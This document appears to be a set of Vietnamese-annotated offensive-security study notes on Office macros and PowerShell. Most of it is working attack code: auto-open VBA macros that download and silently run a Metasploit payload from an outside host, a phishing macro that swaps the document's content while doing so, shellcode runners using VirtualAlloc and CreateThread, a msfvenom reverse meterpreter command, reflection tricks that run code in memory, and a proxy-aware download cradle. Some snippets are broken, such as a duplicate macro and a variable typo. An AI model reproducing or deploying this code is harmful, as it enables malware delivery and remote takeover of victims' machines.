1. Basic code VBA
```vb
Sub Document_Open()
    myMacro
End Sub

Sub AutoOpen()
    myMacro
End Sub

Sub myMacro()
	ShellcodeRunner
End Sub

Sub myMacro()
Dim myLong As Long
myLong = 1
If myLong < 5 Then
    MsgBox ("True")
Else
    MsgBox ("False")
End If

End Sub
```

2. Exercise: Dùng hàm Environ$ để in username và computer name
```vb
Sub PrintUserNameAndComputerName()
    Dim i As Integer
    Dim username As String
    Dim computername As String
    
    ' Get the username and computer name
    username = Environ$("USERNAME")
    computername = Environ$("COMPUTERNAME")
    
    ' Loop to print 5 times
    For i = 1 To 5
        MsgBox "Username: " & username & vbCrLf & "Computer Name: " & computername
    Next i
End Sub
```

3. Code VBA 2, dùng để tải file về ổ cứng có thời gian chờ và thực thi nó 
```vb
Sub Document_Open() 
    myMacro
End Sub

Sub AutoOpen()
    myMacro
End Sub

Sub myMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.101.101.63/uploads/msfstaged.exe','C:\Windows\Temp\payload.exe')"
    Shell str, vbHide
    Dim exePath As String
	  exePath = "C:\Windows\Temp\payload.exe"
    Wait (3)
    Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

4. Bài tập áp dụng trên Excel
```vb
Private Sub Workbook_Open()
    myMacro
End Sub

Sub Auto_Open()
    myMacro
End Sub

Sub myMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.101.101.63/uploads/msfstaged.exe','C:\Windows\Temp\payload.exe')"
    Shell str, vbHide
    Dim exePath As String
	exePath = "C:\Windows\Temp\payload.exe"
    Application.Wait (Now + TimeValue("0:00:03"))
    Shell exePath, vbHide
End Sub
```

5. Code VBA dùng để phishing trong MS Word
```vb
Sub Document_Open()
	SubstitutePage
End Sub

Sub AutoOpen()
	SubstitutePage
End Sub

Sub SubstitutePage()
	 ActiveDocument.Content.Select
	 Selection.Delete
	 ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
	 myMacro
End Sub

Sub myMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.101.101.63/uploads/msfstaged.exe','C:\Windows\Temp\payload.exe')"
    Shell str, vbHide
    Dim exePath As String
	exePath = "C:\Windows\Temp\payload.exe"
    Wait (3)
    Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

6. Code VBA hiển thị tên của máy hiện tại
```vb
Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long

Sub MyMacro()
    Dim res As Long
    Dim MyBuff As String * 256
    Dim MySize As Long
    Dim strlen As Long
    MySize = 256
    
    res = GetUserName(MyBuff, MySize)
    strlen = InStr(1, MyBuff, vbNullChar) - 1
    MsgBox Left$(MyBuff, strlen)
End Sub
```

7. Simple Shell Code runner VBA
```vb
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function ShellcodeRunner()
' SHELLCODE
    Dim buf As Variant
    buff = "Something"

' REVERSE SPACE
    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(buf), &H300, &H40)

' COPY COUNTER
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

'CREATE THREAD
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub MyMacro()
	ShellcodeRunner
End Sub

Sub Document_Open()
    ShellcodeRunner
End Sub

Sub AutoOpen()
    ShellcodeRunner
End Sub
```

8. C# để hiện thông báo
```cs
# Tạo ra lớp với để tương tác với Win32 API, imports the MessageBox signature

$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int MessageBox(IntPtr hWnd, String text, 
String caption, int options);
} 
"@

# Add-Type sử dụng .NET framework để biên dịch mã C# chứa khai báo Win32 API
Add-Type $User32

# Thực thi API
[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
```

9. Simple PowerShell Code Runner C# 
```cs
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
 [DllImport("kernel32")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
 public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,  uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 [DllImport("kernel32.dll", SetLastError=true)]
 public static extern UInt32 WaitForSingleObject(IntPtr hHandle,  UInt32 dwMilliseconds);
 } 
"@
Add-Type $Kernel32

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60

$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

10. C# để định nghĩa delegate type trong PowerShell. Gọi MessageBoxA mà không cần Add-Type, thực thi nó trong bộ nhớ đệm
```
function LookupFunc {

Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
        Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
} 

$MessageBoxA = LookupFunc user32.dll MessageBoxA

# Creating a custom assembly object in memory
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')

# Setting the access mode of the MyAssembly to Run
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)

# Creating a custom module inside the assembly
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)

# Creating a custom type in the assembly
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

# Creating a constructor for the custom delegate type
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(
'RTSpecialName, HideBySig, Public', 
 [System.Reflection.CallingConventions]::Standard, 
 @([IntPtr], [String], [String], [int]))

# Setting implementation flags for the constructor  
$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')

#  Defining and configuring the Invoke method
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 
'Public, HideBySig, NewSlot, Virtual', 
 [int], 
 @([IntPtr], [String], [String], [int]))

$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')

# To instantiate the delegate type, we call our custom constructor through the CreateType method
$MyDelegateType = $MyTypeBuilder.CreateType()

# Have a delegate type to use
$MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType)

$MyFunction.Invoke([IntPtr]::Zero,"Hello World","This is My MessageBox",0)
```
11. C# PowerShell Code Runner without using Add-Type  

```
function LookupFunc {

Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
        Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
} 

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    ) 
 
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]) 
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed') 
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed') 
     
    return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = sudo msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=443 EXITFUNC=thread -f ps1

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

12. Full code for SYSTEM integrity proxy aware download cradle
```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\' 
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = (New-Object Net.WebClient).DownloadString('http://X.X.X.X/run2.ps1')
```


